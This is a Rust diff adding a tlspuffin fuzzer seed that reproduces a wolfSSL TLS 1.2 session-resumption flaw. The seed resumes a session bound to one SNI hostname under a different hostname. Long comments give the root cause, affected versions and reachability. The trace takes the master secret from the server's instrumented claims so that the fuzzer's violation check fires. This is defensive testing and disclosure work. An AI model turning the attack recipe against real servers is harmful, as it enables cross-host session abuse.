@@ -2,10 +2,12 @@
 
 use puffin::agent::{AgentDescriptor, AgentName};
 use puffin::algebra::dynamic_function::TypeShape;
+use puffin::algebra::Term;
 use puffin::put_registry::Factory;
 use puffin::trace::{Action, InputAction, OutputAction, Step, Trace};
 use puffin::{input_action, term};
 
+use crate::claims::Finished;
 use crate::protocol::{
     AgentType, MessageFlight, TLSDescriptorConfig, TLSProtocolBehavior, TLSProtocolTypes,
     TLSVersion,
@@ -13,6 +15,7 @@ use crate::protocol::{
 use crate::query::TlsQueryMatcher;
 use crate::tls::fn_impl::*;
 use crate::tls::rustls::msgs::enums::HandshakeType;
+use crate::tls::rustls::msgs::handshake::SessionID;
 use crate::tls::rustls::msgs::message::OpaqueMessage;
 use crate::tls::seeds::*;
 
@@ -42,6 +45,9 @@ pub fn create_corpus(
 
         // Downgrade attack: the client offers both TLS 1.2 and TLS 1.3 (`TLSVersion::Both`).
         seed_cve_2024_5814: put.supports("tls12") && put.supports("tls13"),
+
+        // Stateful (session-ID) resumption across two connections reusing the same agent.
+        seed_cve_2026_11703: put.supports("tls12") && put.supports("tls12_session_resumption"),
     )
 }
 
@@ -1540,6 +1546,318 @@ pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
                     }
                 }),
             },
+        ],
+        ..Default::default()
+    }
+}
+
+/// <https://www.cve.org/CVERecord?id=CVE-2026-11703>
+///
+/// Root cause (CWE-287, cross-connection session-binding check): wolfSSL's stateful
+/// (session-ID) TLS 1.2 resumption - `HandleTlsResumption()` in `internal.c` - looks up the
+/// cached session by ID and only re-validates the Extended Master Secret flag and cipher-suite
+/// membership. It never compares the SNI the resuming ClientHello presents against the SNI
+/// that was bound to the session when it was first established: `SNI_Callback()` runs
+/// unconditionally in `DoClientHello()`, before and independently of the resumption decision,
+/// and `WOLFSSL_SESSION` has no field that even records the original SNI. Fixed upstream by
+/// wolfSSL PR #10489 (released in 5.9.2), which adds that binding check to every resumption
+/// path. The binding infrastructure the patch introduces (`TicketSniHash`/`session->sniHash`)
+/// does not exist at all before the fix (grepped `internal.c`/`internal.h`/`ssl_sess.c`), so
+/// every wolfSSL version in `[3.15.0, 5.9.1]` reproduces this, including the 5.8.4 vendored
+/// here.
+///
+/// Reachability: fully wire-reachable from an untrusted ClientHello (session-ID field + SNI
+/// extension); SNI is on by default (`HAVE_SNI`), no PUT-config change is needed. ALPN is not
+/// usable against this build: `HAVE_ALPN` is not enabled in
+/// `puffin-build/vendors/wolfssl/builder.cmake`, so `ALPN_Select()` is compiled out and the
+/// ALPN extension is never processed server-side; hence this PoC only exercises the SNI
+/// vector. Both connections below are attacker/DY-crafted (no real client agent, mirroring
+/// `seed_client_attacker12`); the `server` agent of the second connection reuses the OS
+/// process of `initial_server` via `prior_traces` plus a matching `AgentDescriptor`
+/// (`Trace::spawn_agents` / `AgentDescriptor::is_reusable_with`), which keeps the same
+/// `WOLFSSL_CTX` - and therefore the same session cache - alive between the two connections,
+/// exactly like the existing TLS 1.3 PSK resumption seeds (`seed_session_resumption_dhe`).
+///
+/// Detection: the second connection completes a genuine abbreviated handshake - same
+/// session ID as the first connection, but under a different SNI - by reusing the first
+/// connection's master secret (via `fn_get_master_secret12`/`fn_client_sign_transcript_resumed12`,
+/// read out of `initial_server`'s own claims, since the master secret itself never appears
+/// on the wire) to derive this connection's keys and produce a valid encrypted `Finished`.
+/// This makes the server emit a real `Finished` claim for `server`, which the one-sided
+/// rule in `tls::violation::check_violation` (the two-Server-claims branch) picks up
+/// automatically: same non-empty `session_id`, different `server_name` -> violation.
+pub fn seed_cve_2026_11703(
+    initial_server: AgentName,
+    server: AgentName,
+) -> Trace<TLSProtocolTypes> {
+    let hostname_a = term! { fn_default_server_name };
+
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_cipher_suites_make(
+                (fn_append_cipher_suite(
+                  (fn_new_cipher_suites()),
+                  // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+                  fn_cipher_suite12
+            )))),
+            fn_compressions,
+            (fn_client_extensions_make(
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            (fn_client_extensions_append(
+                                (fn_client_extensions_append(
+                                    fn_client_extensions_new,
+                                    (fn_support_group_extension_make(
+                                        (fn_support_group_extension_append(
+                                            fn_support_group_extension_new,
+                                            fn_named_group_secp384r1
+                                        ))
+                                    ))
+                                )),
+                                (fn_signature_algorithm_extension(
+                                    (fn_supported_signature_schemes_extension_append(
+                                        (fn_supported_signature_schemes_extension_append(
+                                            fn_supported_signature_schemes_extension_new,
+                                            fn_sig_scheme_rsa_pkcs1_sha256
+                                        )),
+                                        fn_sig_scheme_rsa_pss_sha256
+                                    ))
+                                ))
+                            )),
+                            fn_ec_point_formats_extension
+                        )),
+                        fn_signed_certificate_timestamp_extension
+                    )),
+                     // Enable Renegotiation
+                    (fn_renegotiation_info_extension((fn_payload_u8(fn_empty_bytes_vec))))
+                )),
+                // Bind this (cached) session to hostname A
+                (fn_server_name_extension((@hostname_a)))
+            ))
+        )))
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript12,
+                (@client_hello) // ClientHello
+            )),
+            ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]) // plaintext ServerHello
+        )
+    };
+
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_transcript),
+            ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::Certificate)))]) // Certificate
+        )
+    };
+
+    let server_key_exchange_transcript = term! {
+      fn_append_transcript(
+            (@certificate_transcript),
+            ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]) // ServerKeyExchange
+        )
+    };
+
+    let server_hello_done_transcript = term! {
+      fn_append_transcript(
+            (@server_key_exchange_transcript),
+            ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHelloDone)))]) // ServerHelloDone
+        )
+    };
+
+    let client_key_exchange = term! {
+        fn_client_key_exchange(
+            (fn_encode_ec_pubkey12(
+                (fn_payload_u8((fn_new_pubkey12(fn_named_group_secp384r1))))
+            ))
+        )
+    };
+
+    let client_key_exchange_transcript = term! {
+      fn_append_transcript(
+            (@server_hello_done_transcript),
+            (@client_key_exchange)
+        )
+    };
+
+    let client_verify_data = term! {
+        fn_client_sign_transcript(
+            ((initial_server, 0)),
+            (fn_decode_server_ecdh_pubkey(
+                ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
+            )),
+            (@client_key_exchange_transcript),
+            fn_named_group_secp384r1,
+            fn_new_random,
+            fn_cipher_suite12
+        )
+    };
+
+    // Step 1: a full handshake, bound to hostname A, that leaves a session cached on
+    // `initial_server`.
+    let initial_handshake = Trace {
+        prior_traces: vec![],
+        descriptors: vec![TLSDescriptorConfig::new_server(initial_server, TLSVersion::V1_2)],
+        steps: vec![
+            Step {
+                agent: initial_server,
+                action: Action::Input(input_action! { client_hello }),
+            },
+            Step {
+                agent: initial_server,
+                action: Action::Input(input_action! { client_key_exchange }),
+            },
+            Step {
+                agent: initial_server,
+                action: Action::Input(input_action! { term! { fn_change_cipher_spec } }),
+            },
+            Step {
+                agent: initial_server,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt12(
+                            (fn_finished((@client_verify_data))),
+                            ((initial_server, 0)),
+                            (fn_decode_server_ecdh_pubkey(
+                                ((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
+                            )),
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_0,
+                            fn_new_random,
+                            fn_cipher_suite12
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    };
+
+    let hostname_b = term! { fn_other_server_name };
+
+    // Session ID the server itself assigned to the cached session above.
+    let resumed_session_id = term! {
+        (initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]/SessionID
+    };
+
+    // Step 2: `server` reuses the same OS process/`WOLFSSL_CTX` as `initial_server` (same
+    // descriptor config -> `is_reusable_with` renames and resets it instead of spawning a
+    // fresh one), so its session cache still holds the session from step 1. This ClientHello
+    // asks to resume that exact session (by ID) but presents hostname B instead of A.
+    let resumption_client_hello = term! {
+        fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            (@resumed_session_id),
+            (fn_cipher_suites_make(
+                (fn_append_cipher_suite(
+                    (fn_new_cipher_suites()),
+                    fn_cipher_suite12
+                ))
+            )),
+            fn_compressions,
+            (fn_client_extensions_make(
+                (fn_client_extensions_append(
+                    fn_client_extensions_new,
+                    (fn_server_name_extension((@hostname_b)))
+                ))
+            ))
+        )
+    };
+
+    // Transcript of the resumed connection only: ClientHello + ServerHello, nothing else
+    // (an abbreviated handshake has no Certificate/ServerKeyExchange/ServerHelloDone).
+    let resumed_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript12,
+                (@resumption_client_hello)
+            )),
+            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))])
+        )
+    };
+
+    // The master secret never appears on the wire - it is read out of `initial_server`'s
+    // own claims (see `fn_get_master_secret12`), the same way a real attacker could not,
+    // but is necessary here to actually finish the abbreviated handshake and let the
+    // automatic security-violation check (`violation.rs`) fire on a real `Finished` claim
+    // instead of us having to infer the bug from the shape of the wire traffic.
+    let master_secret = term! {
+        fn_get_master_secret12(
+            ((initial_server, 0) / Finished)
+        )
+    };
+
+    // In an abbreviated handshake the server sends its own Finished *before* the
+    // client's (right after ServerHello, since there is no key exchange to wait for), so
+    // RFC 5246's "all handshake messages up to but not including this one" for the
+    // client's Finished includes the server's Finished too - unlike a full handshake,
+    // where the client's Finished comes first and only covers ClientHello..ClientKeyExchange.
+    let server_finished_resumed = term! {
+        fn_decrypt12_resumed(
+            ((server, 0)[Some(TlsQueryMatcher::Handshake(None))]),
+            ((server, 0)),
+            (@master_secret),
+            fn_true,
+            fn_seq_0,
+            fn_new_random,
+            fn_cipher_suite12
+        )
+    };
+
+    let resumed_transcript_with_server_finished = term! {
+        fn_append_transcript(
+            (@resumed_transcript),
+            (@server_finished_resumed)
+        )
+    };
+
+    let client_verify_data_resumed = term! {
+        fn_client_sign_transcript_resumed12(
+            ((server, 0)),
+            (@master_secret),
+            (@resumed_transcript_with_server_finished),
+            fn_new_random,
+            fn_cipher_suite12
+        )
+    };
+
+    Trace {
+        prior_traces: vec![initial_handshake],
+        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_2)],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { resumption_client_hello }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! { fn_change_cipher_spec } }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt12_resumed(
+                            (fn_finished((@client_verify_data_resumed))),
+                            ((server, 0)),
+                            (@master_secret),
+                            fn_true,
+                            fn_seq_0,
+                            fn_new_random,
+                            fn_cipher_suite12
+                        )
+                    }
+                }),
+            },
+            OutputAction::new_step(server),
         ],
         ..Default::default()
     }
